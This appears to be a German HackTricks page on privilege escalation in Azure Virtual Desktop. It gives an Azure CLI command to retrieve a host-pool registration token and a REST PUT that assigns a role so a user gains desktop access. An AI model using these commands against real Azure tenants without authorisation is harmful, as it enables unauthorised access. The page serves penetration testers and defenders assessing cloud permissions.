# Az - Virtual Desktop Privesx

{{#include ../../../banners/hacktricks-training.md}}

## Azure Virtual Desktop Privesc

Für weitere Informationen zu Azure Virtual Desktop siehe:

{{#ref}}
../az-services/az-virtual-desktop.md
{{#endref}}


### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
Sie können das Registrierungstoken abrufen, das verwendet wird, um virtuelle Maschinen innerhalb eines Hostpools zu registrieren.
```bash
az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
```
### Microsoft.Authorization/roleAssignments/read, Microsoft.Authorization/roleAssignments/write

> [!WARNING]
> Ein Angreifer mit diesen Berechtigungen könnte viel gefährlichere Dinge tun als dieses hier.

Mit diesen Berechtigungen können Sie eine Benutzerzuweisung zur Anwendungsgruppe hinzufügen, die erforderlich ist, um auf die virtuelle Maschine des virtuellen Desktops zuzugreifen:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
--body '{
"properties": {
"roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
"principalId": "<USER_OBJECT_ID>"
}
}'
```
Beachten Sie, dass ein Benutzer, um auf einen Desktop oder eine App zugreifen zu können, auch die Rolle `Virtual Machine User Login` oder `Virtual Machine Administrator Login` über die VM benötigt. 

{{#include ../../../banners/hacktricks-training.md}}
